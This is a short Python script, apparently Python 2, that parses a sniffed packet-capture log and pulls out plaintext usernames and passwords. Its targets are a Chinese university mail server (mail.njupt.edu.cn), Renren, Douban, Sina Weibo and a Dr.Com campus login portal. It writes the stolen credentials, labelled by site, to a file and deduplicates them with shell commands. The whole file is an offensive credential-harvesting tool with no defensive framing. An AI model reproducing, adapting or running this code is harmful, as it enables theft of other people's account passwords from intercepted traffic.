#coding=utf-8
import re
import os 
from os import system
f=open('/var/sec/pcap_log_','r')
f1=open('/var/sec/pcap_log','w')
for line in f:
	if line.find('mail.njupt.edu.cn')>-1:
		uid_pattern=re.compile(r'(?<=uid=)[\S]*(?=&)')
		pass_pattern=re.compile(r'(?<=password=)[\S]+')
		try:		
			uid=uid_pattern.search(line).group(0)
			passwd=pass_pattern.search(line).group(0)
			s='南邮邮箱 mail.njupt.edu.cn\tUser:'+uid+'\tPasswd:'+passwd+'\n'
			f1.write(s)
		except:
			pass
        if line.find('www.renren.com')>-1:
                uid_pattern=re.compile(r'(?<=email=)[\S]+(?=&icode=)')
                pass_pattern=re.compile(r'(?<=password=)[\S]+(?=&)')
                try:            
                        uid=uid_pattern.search(line).group(0)
                        passwd=pass_pattern.search(line).group(0)
                        s='人人网 www.renren.com\tUser:'+uid+'\tPasswd:'+passwd+'\n'
                        f1.write(s)
                except:
                        pass
        if line.find('192.168.168.168')>-1:
                uid_pattern=re.compile(r'(?<=DDDDD=)[\S]*(?=&upass)')
                pass_pattern=re.compile(r'(?<=upass=)[\S]+(?=&)')
                try:            
                        uid=uid_pattern.search(line).group(0)
                        passwd=pass_pattern.search(line).group(0)
                        s='城市热点Dr.Com\tUser:'+uid+'\tPasswd:'+passwd+'\n'
                        f1.write(s)
                except:
                        pass
	
        if line.find('3g.renren.com')>-1:
                uid_pattern=re.compile(r'(?<=email=)[\S]*(?=&password=)')
                pass_pattern=re.compile(r'(?<=password=)[\S]{6,15}(?=&verify)')
                try:            
                        uid=uid_pattern.search(line).group(0)
                        passwd=pass_pattern.search(line).group(0)
                        s='人人网 3G.renren.com\tUser:'+uid+'\tPasswd:'+passwd+'\n'
                        f1.write(s)
                except:
                        pass
        if line.find('m.douban.com')>-1:
                uid_pattern=re.compile(r'(?<=form_email=)[\S]*(?=&form_password)')
                pass_pattern=re.compile(r'(?<=form_password=)[\S]{6,15}(?=&captcha-)')
                try:            
                        uid=uid_pattern.search(line).group(0)
                        passwd=pass_pattern.search(line).group(0)
                        s='豆瓣Douban.com\tUser:'+uid+'\tPasswd:'+passwd+'\n'
                        f1.write(s)
                except:
                        pass

        if line.find('3g.sina.com.cn')>-1:
                uid_pattern=re.compile(r'(?<=mobile=)[\S]*(?=&password)')
                pass_pattern=re.compile(r'(?<=password=)[\S]+(?=&remember)')
                try:
                        uid=uid_pattern.search(line).group(0)
                        passwd=pass_pattern.search(line).group(0)
                        s='微博 3G.sina.com.cn\tUser:'+uid+'\tPasswd:'+passwd+'\n'
                        f1.write(s)
                except:
                        pass
f.close()
f1.close()
system("mv /var/sec/pcap_log /var/sec/pcap_log1")
system("sort -u /var/sec/pcap_log1 >/var/sec/pcap_log")
system("rm /var/sec/pcap_log1")

